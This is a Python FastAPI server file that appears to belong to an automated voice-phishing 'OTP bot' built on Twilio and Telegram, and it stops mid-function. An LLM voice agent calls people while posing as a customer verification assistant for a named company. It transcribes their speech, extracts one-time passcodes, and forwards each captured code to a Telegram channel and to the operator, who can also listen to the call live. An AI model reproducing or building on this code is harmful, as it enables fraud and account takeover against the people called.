"""
FastAPI server handling:
- WebSocket endpoint for browser clients: `/ws/live?call_id=...`
- WebSocket endpoint for Twilio Media Streams (incoming audio): `/twilio/media` (accepts JSON events)
- HTTP endpoints for Twilio status webhook and hangup control
- Mounted Flask app for Telegram webhook and other bot routes

Run with: `uvicorn live_listen.server:app --host 0.0.0.0 --port 5001` (or any free port)
"""
import asyncio
import base64
import json
import os
import threading
import requests
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request, HTTPException
from fastapi.responses import JSONResponse, HTMLResponse, Response
from fastapi.middleware.wsgi import WSGIMiddleware
from typing import Optional

from config import (
    ACCOUNT_SID, AUTH_TOKEN, LIVE_LISTEN_URL, NGROK_URL, LIVE_LISTEN_SECRET,
    DEFAULT_VOICE_ID, VOICE_STABILITY, VOICE_SIMILARITY_BOOST,
    USE_AI_FLOW, VOUCH_CHANNEL_ID, build_public_base_url
)
from twilio.rest import Client
from twilio.twiml.voice_response import VoiceResponse, Gather, Start
import logging

from live_listen.manager import manager

# Import AI modules (graceful degradation if missing)
try:
    from ai.session import get_session, remove_session
    from ai.llm import chat_with_ai
    from ai.tts import save_audio, generate_telephony_audio
    from ai.utils import extract_otp, send_otp_to_channel
    
    # ASR: Initialize Groq Whisper (no external audio libraries needed)
    try:
        from ai.asr import process_ulaw_buffer, initialize_asr
        asr_initialized = initialize_asr()
        if not asr_initialized:
            logger_temp = logging.getLogger(__name__)
            logger_temp.error("[STARTUP] Groq Whisper ASR initialization failed - transcription disabled")
            # Stub: return empty string if ASR unavailable
            def process_ulaw_buffer(ulaw_bytes: bytes, context: dict | None = None) -> str:
                return ""
    except (ImportError, Exception) as e:
        logger_temp = logging.getLogger(__name__)
        logger_temp.error(f"[STARTUP] ASR import failed: {e} - transcription disabled")
        # Stub: return empty string if ASR unavailable
        def process_ulaw_buffer(ulaw_bytes: bytes, context: dict | None = None) -> str:
            return ""
    
    AI_AVAILABLE = True
except ImportError as e:
    AI_AVAILABLE = False
    import traceback
    print(f"[STARTUP] WARNING AI modules NOT available: {e}")
    traceback.print_exc()
except Exception as e:
    AI_AVAILABLE = False
    import traceback
    print(f"[STARTUP] CRITICAL AI import error: {e}")
    traceback.print_exc()

logger = logging.getLogger(__name__)

class LoggingWSGIMiddleware:
    def __init__(self, wsgi_app):
        self.wsgi_middleware = WSGIMiddleware(wsgi_app)

    async def __call__(self, scope, receive, send):
        path = scope.get("path")
        scope_type = scope.get("type")
        headers = {k.decode(): v.decode() for k, v in scope.get("headers", []) if k in (b"host", b"upgrade", b"connection")}
        logger.warning(
            "[FLASK_MOUNT_ASGI] incoming scope type=%s path=%s headers=%s",
            scope_type,
            path,
            headers,
        )
        if scope_type == "websocket":
            logger.error("[FLASK_MOUNT_ASGI] WebSocket scope reached Flask mount wrapper: %s - rejecting at wrapper", path)
            await send({"type": "websocket.close", "code": 1003})
            return
        if scope_type != "http":
            logger.error("[FLASK_MOUNT_ASGI] Non-HTTP scope reached Flask mount wrapper: %s type=%s - rejecting", path, scope_type)
            await send({"type": "http.response.start", "status": 500, "headers": [(b"content-type", b"text/plain; charset=utf-8")]})
            await send({"type": "http.response.body", "body": b"Unsupported ASGI scope type for Flask mount", "more_body": False})
            return
        return await self.wsgi_middleware(scope, receive, send)

if USE_AI_FLOW and AI_AVAILABLE:
    logger.warning("[STARTUP] OK - AI FLOW ENABLED - All AI modules available")
elif USE_AI_FLOW and not AI_AVAILABLE:
    logger.error("[STARTUP] CRITICAL: USE_AI_FLOW=true but AI modules not available!")
elif not USE_AI_FLOW:
    logger.warning("[STARTUP] AI flow disabled (USE_AI_FLOW=false)")

app = FastAPI()
logger.warning("[SERVER_STARTUP] FastAPI app created successfully")
twilio_client = Client(ACCOUNT_SID, AUTH_TOKEN)
logger.warning("[SERVER_STARTUP] Twilio client initialized")

# Register startup event IMMEDIATELY after app creation
# This ensures webhook/polling is set up when uvicorn starts the app
@app.on_event("startup")
async def startup_event():
    """Webhook and polling setup - runs when FastAPI starts."""
    import logging as _log
    import sys
    logger_startup = _log.getLogger(__name__)
    
    # CRITICAL: Log that startup event is firing - use print() for guaranteed output to console
    msg_sep = "="*70
    msg_startup = f"\n{msg_sep}\n[STARTUP_EVENT_FIRED] FastAPI startup event is running NOW\n{msg_sep}\n"
    print(msg_startup, file=sys.stderr, flush=True)
    print(msg_startup, file=sys.stdout, flush=True)
    logger_startup.warning(msg_startup)

    # Dump the FastAPI route table at startup for precise routing diagnostics
    def format_route(r):
        name = r.__class__.__name__
        path = getattr(r, 'path', None)
        if path is None:
            path = getattr(r, 'prefix', None)
        if path is None:
            if name == 'Mount':
                path = '/'
            else:
                path = str(r)
        return f"{name}('{path}')"

    route_table = [format_route(route) for route in app.router.routes]
    websocket_routes = [line for line in route_table if line.startswith('APIWebSocketRoute(') or line.startswith('WebSocketRoute(')]
    twilio_media_route = [line for line in websocket_routes if '/twilio/media' in line]
    mount_routes = [i for i, route in enumerate(route_table) if route.startswith('Mount(')]
    twilio_index = next((i for i, route in enumerate(route_table) if '/twilio/media' in route), None)
    mount_index = mount_routes[0] if mount_routes else None

    logger_startup.warning("[ROUTE_TABLE] %s", "\n" + "\n".join(route_table))
    print("[ROUTE_TABLE]", file=sys.stdout)
    for idx, line in enumerate(route_table):
        print(f"{idx}: {line}", file=sys.stdout)

    if websocket_routes:
        logger_startup.warning("[WEBSOCKET_ROUTES] %s", "\n" + "\n".join(websocket_routes))
        print("[WEBSOCKET_ROUTES]", file=sys.stdout)
        for line in websocket_routes:
            print(line, file=sys.stdout)
    else:
        logger_startup.warning("[WEBSOCKET_ROUTES] none registered")
        print("[WEBSOCKET_ROUTES] none registered", file=sys.stdout)

    if not twilio_media_route:
        logger_startup.error("[ROUTE_CHECK] /twilio/media WebSocket route NOT registered")
        print("[ROUTE_CHECK] /twilio/media WebSocket route NOT registered", file=sys.stdout)
    else:
        logger_startup.warning("[ROUTE_CHECK] /twilio/media WebSocket route registered")
        print("[ROUTE_CHECK] /twilio/media WebSocket route registered", file=sys.stdout)

    if mount_index is not None and twilio_index is not None:
        if mount_index > twilio_index:
            logger_startup.warning("[ROUTE_CHECK] Flask Mount is registered after /twilio/media WebSocket route")
            print("[ROUTE_CHECK] Flask Mount is registered after /twilio/media WebSocket route", file=sys.stdout)
        else:
            logger_startup.error("[ROUTE_CHECK] Flask Mount is registered before /twilio/media WebSocket route")
            print("[ROUTE_CHECK] Flask Mount is registered before /twilio/media WebSocket route", file=sys.stdout)
            raise RuntimeError("[ROUTE_CHECK] Invalid routing configuration: Flask mount precedes /twilio/media WebSocket route")
    elif mount_index is not None and twilio_index is None:
        logger_startup.error("[ROUTE_CHECK] /twilio/media WebSocket route missing while Flask mount exists")
        print("[ROUTE_CHECK] /twilio/media WebSocket route missing while Flask mount exists", file=sys.stdout)
        raise RuntimeError("[ROUTE_CHECK] Invalid routing configuration: /twilio/media WebSocket route missing")
    elif mount_index is None and twilio_index is None:
        logger_startup.error("[ROUTE_CHECK] No Flask mount and no /twilio/media WebSocket route registered")
        print("[ROUTE_CHECK] No Flask mount and no /twilio/media WebSocket route registered", file=sys.stdout)
        raise RuntimeError("[ROUTE_CHECK] Invalid routing configuration: missing both Flask mount and /twilio/media WebSocket route")

    try:
        from bot import get_runtime_mode, bot, USE_WEBHOOK, set_telegram_webhook, mark_webhook_mode
        from bot import start_bot_polling, force_delete_telegram_webhook
        
        runtime_mode = get_runtime_mode(bot)
        logger_startup.warning(f"[STARTUP_EVENT] Mode={runtime_mode}, USE_WEBHOOK={USE_WEBHOOK}")
        logger_startup.info(f"⏰ FastAPI Startup Event: Setting up Telegram integration (mode={runtime_mode})")
        
        if runtime_mode == "full":
            if USE_WEBHOOK:
                logger_startup.warning(f"[STARTUP_EVENT] Attempting webhook setup...")
                if set_telegram_webhook():
                    logger_startup.warning("[STARTUP_EVENT_SUCCESS] ✅ Webhook enabled; polling disabled.")
                else:
                    logger_startup.error("[STARTUP_EVENT_FAILED] ⚠️ Telegram webhook setup failed; falling back to polling.")
                    mark_webhook_mode(False)
                    start_bot_polling(allowed_updates=["message", "callback_query", "chat_member"])
            else:
                logger_startup.warning(f"[STARTUP_EVENT] USE_WEBHOOK=False; starting polling...")
                try:
                    bot.remove_webhook()
                    logger_startup.info("Telegram webhook removed before polling startup.")
                except Exception as remove_exc:
                    logger_startup.debug(f"bot.remove_webhook() failed: {remove_exc}")
                    if not force_delete_telegram_webhook():
                        logger_startup.warning("Could not remove webhook via HTTP fallback; continuing to start polling.")
                mark_webhook_mode(False)
                start_bot_polling(allowed_updates=["message", "callback_query", "chat_member"])
                logger_startup.warning("[STARTUP_EVENT] Polling started")
        else:
            logger_startup.warning("[STARTUP_EVENT] Skipping Telegram integration (bot not in full mode)")
    except Exception as e:
        logger_startup.error(f"[STARTUP_EVENT_EXCEPTION] Startup event error: {e}", exc_info=True)

@app.on_event("shutdown")
async def shutdown_event():
    """Cleanup on app shutdown."""
    import logging as _log
    logger_shutdown = _log.getLogger(__name__)
    logger_shutdown.info("FastAPI app shutting down")

# Import and mount Flask app for Telegram webhook (lazy import to avoid circular deps)
# This allows FastAPI to handle both FastAPI routes and Flask routes
def mount_flask_app():
    try:
        logger.warning("[FLASK_MOUNT] Starting Flask app mount...")
        from bot import app as flask_app
        logger.warning("[FLASK_MOUNT] Flask app imported successfully")
        # Mount Flask app at root so /telegram_webhook is accessible
        logging_wrapper = LoggingWSGIMiddleware(flask_app)
        app.mount("", logging_wrapper)
        logger.warning("[FLASK_MOUNT] ✅ Flask app mounted to FastAPI - Telegram webhook accessible")
    except Exception as e:
        logger.error(f"[FLASK_MOUNT_ERROR] ⚠️ Could not mount Flask app: {e} - Telegram webhook may not be accessible", exc_info=True)



@app.get('/live')
async def live_ui(request: Request):
    """Serve a simple Live Listen Web App UI. Query param: call_id"""
    html_path = os.path.join(os.path.dirname(__file__), 'static', 'live.html')
    if not os.path.exists(html_path):
        return HTMLResponse('<h1>Live UI not found</h1>', status_code=404)
    return HTMLResponse(open(html_path, 'r', encoding='utf-8').read())


@app.get('/health')
async def health():
    return {'status': 'ok'}


@app.post('/conversation/start')
async def conversation_start(request: Request):
    # Legacy live listen bootstrapping endpoint.
    # This no longer starts a separate conversation engine;
    # it simply creates a live listen session state for the call.
    body = {}
    try:
        body = await request.json()
    except Exception:
        try:
            form = await request.form()
            body = dict(form)
        except Exception:
            body = {}

    call_sid = body.get('call_sid') or body.get('CallSid')
    chat_id = body.get('chat_id')
    if chat_id is not None:
        try:
            chat_id = int(chat_id)
        except (ValueError, TypeError):
            chat_id = None
    if not call_sid:
        raise HTTPException(status_code=400, detail='call_sid required')

    await manager.ensure_session(call_sid, call_sid=call_sid, chat_id=chat_id)
    await manager.set_state(call_sid, 'ringing')
    logger.info("/conversation/start added live listen session for call_sid=%s chat_id=%s", call_sid, chat_id)
    return {'ok': True}


@app.post('/twilio/entry')
async def twilio_entry(request: Request):
    # Legacy endpoint retained only for compatibility.
    # New AI flow uses /ai_start and /twilio/media.
    logger.warning("Deprecated /twilio/entry called; no action taken")
    return JSONResponse({'ok': False, 'error': 'deprecated'}, status_code=410)


def notify_bot_of_digits(chat_id: str, call_sid: str, digits: str) -> None:
    if not NGROK_URL or not chat_id or not call_sid or not digits:
        return
    url = f"{NGROK_URL.rstrip('/')}/live_capture_otp"
    payload = {"chat_id": chat_id, "call_sid": call_sid, "digits": digits}
    headers = {}
    if LIVE_LISTEN_SECRET:
        headers["X-Live-Listen-Secret"] = LIVE_LISTEN_SECRET
    try:
        requests.post(url, json=payload, timeout=3, headers=headers)
    except Exception:
        pass


@app.post('/twilio/dtmf')
async def twilio_dtmf(request: Request):
    # Legacy DTMF callback endpoint. The AI media stream flow no longer uses this.
    logger.warning("Deprecated /twilio/dtmf called; no action taken")
    return JSONResponse({'ok': False, 'error': 'deprecated'}, status_code=410)


@app.websocket('/ws/live')
async def websocket_live(websocket: WebSocket, call_id: Optional[str] = None):
    """Browser Web App connects here to receive binary audio frames.

    Query params: call_id
    Sends: binary audio frames directly as bytes (clients should decode/play)
   """
    if not call_id:
        await websocket.close(code=1008)
        return
    await websocket.accept()
    await manager.add_client(call_id, websocket)
    try:
        # Notify client of session state on connect
        s = await manager.ensure_session(call_id)
        await websocket.send_text(json.dumps({'type': 'session', 'data': s.to_dict()}))
        while True:
            # Keep connection alive; we don't expect client messages except pings
            msg = await websocket.receive_text()
            # ignore or handle simple control messages
            await websocket.send_text(json.dumps({'type': 'pong'}))
    except WebSocketDisconnect:
        await manager.remove_client(call_id, websocket)
    except Exception:
        await manager.remove_client(call_id, websocket)
        await websocket.close()


@app.get('/twilio/media-test')
async def twilio_media_test():
    """Test endpoint to verify FastAPI routing works for /twilio/media path."""
    return {"ok": True, "message": "FastAPI routing works for /twilio/media path"}


async def send_media_audio(ws: WebSocket, audio_bytes: bytes, call_sid: str, chunk_size: int = 160):
    """Send audio bytes over Twilio Media Stream WebSocket.
    
    Args:
        ws: WebSocket connection to Twilio
        audio_bytes: Raw mu-law 8kHz audio bytes to send
        call_sid: Call ID for logging
        chunk_size: Bytes per chunk (160 bytes ≈ 20ms at 8kHz)
    """
    if not audio_bytes:
        logger.warning(f"[MEDIA_SEND] No audio bytes to send for {call_sid}")
        return
    
    try:
        sequence = 1
        for i in range(0, len(audio_bytes), chunk_size):
            chunk = audio_bytes[i:i+chunk_size]
            payload_b64 = base64.b64encode(chunk).decode('utf-8')
            
            media_event = {
                'event': 'media',
                'media': {
                    'payload': payload_b64,
                    'sequence': str(sequence)
                }
            }
            
            await ws.send_json(media_event)
            sequence += 1
            await asyncio.sleep(0.020)  # ~20ms per frame for 8kHz
        
        logger.warning(f"[MEDIA_SEND] OK: Sent {len(audio_bytes)} bytes ({sequence-1} frames) for {call_sid}")
    except Exception as e:
        logger.error(f"[MEDIA_SEND_ERROR] Failed to send audio for {call_sid}: {e}", exc_info=True)


@app.get('/twilio/media')
async def twilio_media_http(request: Request):
    """
    HTTP GET handler for /twilio/media.
    If a WebSocket upgrade request is downgraded to HTTP by the proxy,
    this catches it so we can see what's happening.
    """
    logger.warning(
        "[WS_HTTP_FALLBACK] /twilio/media accessed via HTTP (not WebSocket) - "
        "headers=%s query=%s client=%s",
        dict(request.headers),
        dict(request.query_params),
        request.client,
    )
    return JSONResponse(
        {"ok": False, "error": "This endpoint requires a WebSocket connection"},
        status_code=426,
    )


@app.websocket('/twilio/media')
async def twilio_media(ws: WebSocket):
    """Twilio Media Streams WebSocket endpoint.
    
    Handles both traditional live listen AND AI-powered call flows.
    If USE_AI_FLOW is enabled, routes to AI handler.
    Otherwise, forwards to traditional manager.
    """
    subprotocol = None
    try:
        subprotocol_header = ws.headers.get('sec-websocket-protocol')
        if subprotocol_header:
            subprotocols = [token.strip() for token in subprotocol_header.split(',') if token.strip()]
            if subprotocols:
                subprotocol = subprotocols[0]
                logger.info("[WS_ACCEPT] Negotiating websocket subprotocol=%s", subprotocol)
                await ws.accept(subprotocol=subprotocol)
            else:
                await ws.accept()
        else:
            await ws.accept()
    except Exception as e:
        logger.error(f"[WS_ACCEPT_ERROR] WebSocket accept failed: {e}", exc_info=True)
        return
    logger.warning(
        "[WS_HANDLER] twilio_media handler entered path=%s type=%s client=%s subprotocol=%s",
        ws.scope.get("path"),
        ws.scope.get("type"),
        ws.client,
        subprotocol,
    )
    # Log connect
    logger.info("[WS_CONNECT] Twilio Media WebSocket connecting client=%s path=%s", ws.client, ws.scope.get('path'))
    call_id = None
    call_sid = None
    session = None
    audio_buffer = bytearray()
    BUFFER_SIZE = 8000  # ~1 second of 8kHz µ-law
    # Per-connection diagnostics
    media_event_count = 0
    total_media_bytes = 0
    last_event = None
    
    try:
        while True:
            msg = await ws.receive_text()
            try:
                data = json.loads(msg)
            except Exception:
                continue

            event = data.get('event')
            logger.info("[TWILIO_EVENT] event=%s keys=%s call_sid=%s", event, list(data.keys()), call_sid)
            last_event = event
            
            # ============ START EVENT ============
            if event == 'start':
                call_sid = data.get('start', {}).get('callSid')
                call_id = call_sid
                logger.info("[TWILIO_START] call_sid=%s caller=%s", call_sid, data.get('start', {}).get('from'))
                
                # Initialize session state for live listen and AI pipeline.
                if USE_AI_FLOW and AI_AVAILABLE:
                    try:
                        session = get_session(call_sid)
                        if session and session.mark_milestone("MEDIA_WS_CONNECTED"):
                            logger.info("[CALL_MILESTONE] MEDIA_WS_CONNECTED call_sid=%s", call_sid)
                        # Populate AI session with server-side call metadata if available.
                        try:
                            from bot import get_call_session
                            meta_session = get_call_session(call_sid)
                            meta = meta_session.to_dict() if meta_session else {}
                            session.custom_script = meta.get('custom_script') or session.custom_script
                            session.code_length = int(meta.get('code_length') or session.code_length)
                            session.voice_id = meta.get('voice_id') or session.voice_id
                            session.chat_id = int(meta.get('chat_id')) if meta.get('chat_id') is not None else session.chat_id
                            session.name = meta.get('name') or session.name
                            session.company = meta.get('company') or session.company
                        except Exception:
                            pass
                        logger.warning(f"[WebSocket_START] OK - AI call session started: {call_sid}")
                        
                        # ===== CRITICAL FIX: SEND INITIAL GREETING =====
                        # The caller needs to hear a greeting immediately when the call connects.
                        # Without this, Twilio sees no early media and times out after ~1 second.
                        try:
                            logger.info("[GREETING_START] Generating initial greeting for call_sid=%s", call_sid)
                            
                            # Generate greeting via AI using system prompt
                            # Start with a generic prompt to trigger the agent's opening line
                            greeting_prompt = (
                                f"You are a professional customer verification assistant. "
                                f"The call has just started. Generate a warm, professional greeting to initiate the conversation. "
                                f"Keep it brief (1-2 sentences) and natural. Address the customer professionally."
                            )
                            
                            # Call the LLM to generate greeting
                            from ai.llm import generate_response
                            from config import get_system_prompt
                            
                            system_prompt = get_system_prompt()
                            greeting_text = generate_response(
                                user_text=greeting_prompt,
                                context="",
                                system_prompt=system_prompt,
                                call_type=session.call_type,
                                emotion=session.emotion,
                                session=session
                            )
                            
                            if greeting_text and len(greeting_text.strip()) > 0:
                                logger.warning(f"[GREETING_GENERATED] call_sid={call_sid} text={greeting_text[:80]}")
                                
                                # Add greeting to conversation history
                                session.add_agent_message(greeting_text)
                                
                                # Generate audio from greeting text
                                greeting_audio = generate_telephony_audio(
                                    greeting_text,
                                    voice_id=session.voice_id,
                                    output_format="ulaw_8000",
                                    call_sid=call_sid,
                                    session=session
                                )
                                
                                if greeting_audio and len(greeting_audio) > 0:
                                    logger.warning(f"[GREETING_AUDIO_GENERATED] call_sid={call_sid} bytes={len(greeting_audio)}")
                                    
                                    # Send greeting audio immediately to caller
                                    await send_media_audio(ws, greeting_audio, call_sid)
                                    logger.warning(f"[GREETING_SENT] ✅ Sent greeting audio to caller: {call_sid}")
                                    
                                    if session and session.mark_milestone("GREETING_SENT"):
                                        logger.info("[CALL_MILESTONE] GREETING_SENT call_sid=%s", call_sid)
                                else:
                                    logger.warning(f"[GREETING_AUDIO_FAILED] Could not generate audio for greeting: {call_sid}")
                            else:
                                logger.warning(f"[GREETING_EMPTY] AI returned empty greeting for call_sid={call_sid}")
                        except Exception as e:
                            logger.error(f"[GREETING_ERROR] Failed to send greeting: {e}", exc_info=True)
                            # Don't fail the entire call if greeting generation fails
                            # The call continues and waits for caller input
                        
                    except Exception as e:
                        logger.error(f"[WebSocket_START] CRITICAL: Failed to get AI session: {e}", exc_info=True)
                    await manager.ensure_session(call_id, call_sid=call_sid)
                    await manager.set_state(call_id, 'in-progress')
                else:
                    if USE_AI_FLOW and not AI_AVAILABLE:
                        logger.error(f"[WebSocket_START] CRITICAL: USE_AI_FLOW=true but AI_AVAILABLE=false. AI modules failed to import! Falling back to live listen only.")
                    else:
                        logger.info(f"[WebSocket_START] Traditional flow for {call_sid} (USE_AI_FLOW=false)")
                    await manager.ensure_session(call_id, call_sid=call_sid)
                    await manager.set_state(call_id, 'in-progress')
            
            # ============ MEDIA EVENT ============
            elif event == 'media':
                media = data.get('media', {})
                payload_b64 = media.get('payload')

                media_event_count += 1
                if payload_b64:
                    try:
                        logger.debug("[MEDIA_PAYLOAD] base64_len=%d media_seq=%s", len(payload_b64), media.get('sequence'))
                    except Exception:
                        pass

                if payload_b64 and call_id:
                    try:
                        audio_bytes = base64.b64decode(payload_b64)
                        if session and session.mark_milestone("FIRST_AUDIO_FRAME_RECEIVED"):
                            logger.info("[CALL_MILESTONE] FIRST_AUDIO_FRAME_RECEIVED call_sid=%s media_count=%d bytes=%d", call_sid, media_event_count, len(audio_bytes))
                        total_media_bytes += len(audio_bytes)
                        logger.info("[MEDIA_DECODE] media_count=%d decoded_bytes=%d total_bytes=%d", media_event_count, len(audio_bytes), total_media_bytes)
                        # Attempt µ-law -> PCM conversion for diagnostic logging
                        try:
                            import audioop
                            try:
                                pcm = audioop.ulaw2lin(audio_bytes, 2)
                                logger.info("[ULAW_CONVERT] success media_count=%d pcm_bytes=%d", media_event_count, len(pcm))
                            except Exception as e:
                                logger.warning("[ULAW_CONVERT] conversion failed for media_count=%d: %s", media_event_count, e)
                                pcm = None
                        except Exception:
                            logger.debug("[ULAW_CONVERT] audioop not available - skipping conversion")

                        # AI FLOW
                        if USE_AI_FLOW and AI_AVAILABLE and session:
                            # BROADCAST TO LIVE LISTEN clients first
                            await manager.broadcast_media(call_id, audio_bytes, sequence=media.get('sequence'))

                            audio_buffer.extend(audio_bytes)
                            logger.debug("[AI_BUFFER] buffered_bytes=%d buffer_len=%d", len(audio_bytes), len(audio_buffer))

                            # Process when buffer reaches ~1 second
                            if len(audio_buffer) >= BUFFER_SIZE:
                                try:
                                    buf_bytes = bytes(audio_buffer)
                                    if session and session.mark_milestone("FIRST_ASR_ATTEMPT"):
                                        logger.info("[CALL_MILESTONE] FIRST_ASR_ATTEMPT call_sid=%s buffer_bytes=%d", call_sid, len(buf_bytes))
                                    logger.info("[AI_PROCESS] processing_buffer_bytes=%d", len(buf_bytes))
                                    # For diagnostics try to convert the whole buffer to PCM
                                    try:
                                        import audioop as _audioop
                                        _pcm_buf = _audioop.ulaw2lin(buf_bytes, 2)
                                        logger.info("[AI_PROCESS] buffer_ulaw_converted_pcm_bytes=%d", len(_pcm_buf))
                                    except Exception:
                                        logger.debug("[AI_PROCESS] buffer conversion skipped/failed")

                                    text = process_ulaw_buffer(
                                        buf_bytes,
                                        context={
                                            "call_sid": call_sid,
                                            "chat_id": session.chat_id if session else None,
                                            "user_id": session.user_id if session and hasattr(session, 'user_id') else None,
                                            "session": session,
                                        }
                                    )
                                    audio_buffer.clear()

                                    if text and len(text) > 1:
                                        logger.warning(f"[AI_TRANSCRIBE] OK: {text}")
                                    else:
                                        # Log reasons for no-capture fallback
                                        if not text:
                                            logger.warning("[AI_TRANSCRIBE_EMPTY] transcript empty for call_sid=%s buffer_bytes=%d", call_sid, len(buf_bytes))
                                        else:
                                            logger.warning("[AI_TRANSCRIBE_SHORT] transcript too short='%s' for call_sid=%s", text, call_sid)

                                    if text and len(text) > 1:
                                        # Check for OTP
                                        otp = extract_otp(text, code_length=session.code_length)
                                        if otp:
                                            session.otp_captured = True
                                            session.otp_value = otp
                                            logger.warning(f"[AI_OTP_FOUND] OK: OTP={otp} (code_length={session.code_length})")
                                            
                                            try:
                                                from bot import bot
                                                send_otp_to_channel(
                                                    otp,
                                                    call_sid,
                                                    session.name,
                                                    session.company,
                                                    bot,
                                                    chat_id=session.chat_id,
                                                    prompt_buttons=True,
                                                )
                                                logger.warning(f"[AI_OTP_SENT] OK: Sent to channel and user chat_id={session.chat_id}")
                                            except Exception as e:
                                                logger.error(f"[AI_OTP_ERROR] CRITICAL: {e}", exc_info=True)

                                        # Generate AI response using the permanent system prompt
                                        ai_response = chat_with_ai(
                                            text,
                                            session,
                                            system_prompt=None,
                                            call_type=session.call_type,
                                            emotion=session.emotion
                                        )
                                        logger.warning(f"[AI_RESPONSE] ✅ type={session.call_type}, emotion={session.emotion}: {ai_response[:80]}")

                                        # Generate audio response and send over Media Stream
                                        try:
                                            audio_bytes = generate_telephony_audio(
                                                ai_response,
                                                voice_id=session.voice_id,
                                                output_format="ulaw_8000",
                                                call_sid=call_sid,
                                                session=session
                                            )
                                            
                                            if not audio_bytes:
                                                logger.error(f"[AI_AUDIO_GEN] FAILED: no audio bytes generated for call_sid={call_sid}")
                                                # Do not speak a hardcoded fallback greeting or canned apology.
                                                # If TTS fails, stay silent rather than bypassing the AI flow with a fixed phrase.
                                                continue
                                            
                                            logger.warning(f"[AI_AUDIO_GEN] OK: Generated {len(audio_bytes)} bytes for {call_sid}")
                                            await send_media_audio(ws, audio_bytes, call_sid)
                                            logger.warning(f"[AI_AUDIO_PLAYED] OK: Media frames sent for call_sid={call_sid}")
                                        except Exception as e:
                                            logger.error(f"[AI_AUDIO_PLAYBACK_ERROR] CRITICAL: {e}", exc_info=True)
                                except Exception as e:
                                    logger.error(f"[AI_PROCESS_ERROR] CRITICAL: {e}", exc_info=True)

                        # TRADITIONAL FLOW (fallback)
                        else:
                            if USE_AI_FLOW and not AI_AVAILABLE:
                                logger.warning(f"[FALLBACK] Using traditional flow - AI unavailable")
                            elif not USE_AI_FLOW:
                                logger.debug(f"[TRADITIONAL_FLOW] USE_AI_FLOW=false")
                            await manager.broadcast_media(call_id, audio_bytes, sequence=media.get('sequence'))
                            logger.debug("[TRADITIONAL_BUFFER] queued bytes=%d for call_sid=%s", len(audio_bytes), call_id)
                    
                    except Exception as e:
                        logger.error(f"Media processing error: {e}")
            
            # ============ STOP EVENT ============
            elif event == 'stop':
                logger.warning(f"[CALL_STOPPED] Call ended: {call_sid}")
                if call_id:
                    await manager.set_state(call_id, 'completed')
                if USE_AI_FLOW and AI_AVAILABLE and session:
                    logger.warning(f"[AI_CLEANUP] Removing AI session for {call_sid}")
                    remove_session(call_sid)
                break
    
    except WebSocketDisconnect:
        logger.info(f"[WebSocket_DISCONNECT] {call_sid}")
        if USE_AI_FLOW and AI_AVAILABLE and session:
            remove_session(call_sid)
    except Exception as e:
        logger.error(f"[WebSocket_ERROR] CRITICAL in {call_sid}: {e}", exc_info=True)
        if USE_AI_FLOW and AI_AVAILABLE and session:
            remove_session(call_sid)


@app.post('/twilio/status')
async def twilio_status(request: Request):
    """Receive Twilio call status callbacks (HTTP POST). Expects form-encoded values like `CallSid` and `CallStatus`."""
    form = await request.form()
    call_sid = form.get('CallSid')
    status = form.get('CallStatus')
    answered_by = form.get('AnsweredBy') or form.get('answered_by')
    chat_id = form.get('chat_id') or form.get('chatId') or request.query_params.get('chat_id') or request.query_params.get('chatId')
    user_id = form.get('user_id') or form.get('userId') or request.query_params.get('user_id') or request.query_params.get('userId')
    status_message_id = form.get('status_message_id') or form.get('statusMessageId') or request.query_params.get('status_message_id') or request.query_params.get('statusMessageId')

    # Basic validation
    if not call_sid or not status:
        return JSONResponse({'ok': False}, status_code=400)

    logger.warning("TWILIO STATUS: call=%s status=%s answered_by=%s chat_id=%s user_id=%s", call_sid, status, answered_by, chat_id, user_id)

    # Map Twilio status to manager state and broadcast
    await manager.set_state(call_sid, status)

    # Best-effort: forward the same status into the Flask/bot updater so Telegram
    # shows Ringing / In-progress / Completed messages. Do this safely to avoid
    # introducing crashes in the FastAPI handler.
    try:
        try:
            # Import at runtime to avoid circular imports on startup
            import bot as bot_module
        except Exception:
            bot_module = None

        if bot_module:
            session = None
            try:
                session = bot_module.get_call_session(call_sid)
            except Exception:
                session = None

            if session is None:
                try:
                    session = bot_module.register_call_session(
                        call_sid,
                        user_id=user_id,
                        chat_id=int(chat_id) if chat_id and str(chat_id).isdigit() else chat_id,
                        endpoint="/twilio/status",
                        mode_label="Call Status",
                        status_chat_id=int(chat_id) if chat_id and str(chat_id).isdigit() else chat_id,
                    )
                except Exception as e:
                    logger.debug("[TW_STATUS] failed to register status session: %s", e)
                    session = None

            if session is not None and status_message_id:
                try:
                    session["status_message_id"] = int(status_message_id) if str(status_message_id).isdigit() else status_message_id
                    if chat_id and not session.get("status_chat_id"):
                        session["status_chat_id"] = int(chat_id) if str(chat_id).isdigit() else chat_id
                except Exception:
                    pass

            # Build status text similar to bot.py:/twilio/status
            status_text = None
            final_status = False
            s = str(status)
            if s == "queued":
                status_text = "⏳ Call queued. Awaiting ring..."
            elif s == "ringing":
                status_text = "📞 Ringing..."
            elif s == "in-progress":
                status_text = "▶️ Call in progress..."
            elif s == "completed":
                status_text = "✅ Call ended."
                final_status = True
            elif s == "failed":
                status_text = "❌ Call failed."
                final_status = True
            elif s == "no-answer":
                status_text = "⏱️ No answer."
                final_status = True
            elif s == "busy":
                status_text = "📵 Line busy."
                final_status = True
            elif s == "canceled":
                status_text = "❌ Call canceled."
                final_status = True

            if status_text:
                updated = False
                try:
                    updated = bot_module.update_call_status_message(call_sid, status_text, final=final_status)
                except Exception:
                    updated = False

                if not updated and chat_id:
                    try:
                        msg = bot_module.safe_bot_send_message(int(chat_id), status_text)
                        if msg is not None and getattr(msg, "message_id", None) and session is not None:
                            session["status_message_id"] = msg.message_id
                            session["status_chat_id"] = int(chat_id)
                    except Exception:
                        logger.debug("[TW_STATUS_FORWARD] fallback send failed for %s", call_sid)

            # If final and completed, send final summary similar to Flask path
            if final_status and s == "completed":
                try:
                    session = bot_module.get_call_session(call_sid)
                    answered_by_text = (session.get("answered_by") if session else None) or answered_by or "unknown"
                    detection_text = bot_module.get_answered_by_label(answered_by_text)
                    summary = (
                        f"✅ Call ended.\n"
                        f"{detection_text}\n"
                        f"CallSid: {call_sid}"
                    )
                    if not bot_module.update_call_status_message(call_sid, summary, final=True):
                        status_chat = None
                        if session is not None:
                            status_chat = session.get("status_chat_id") or session.get("chat_id")
                        if status_chat:
                            try:
                                bot_module.bot.send_message(int(status_chat), summary)
                            except Exception:
                                pass
                except Exception:
                    logger.debug("[TW_STATUS_FORWARD] Failed to send final call summary for %s", call_sid)

    except Exception as e:
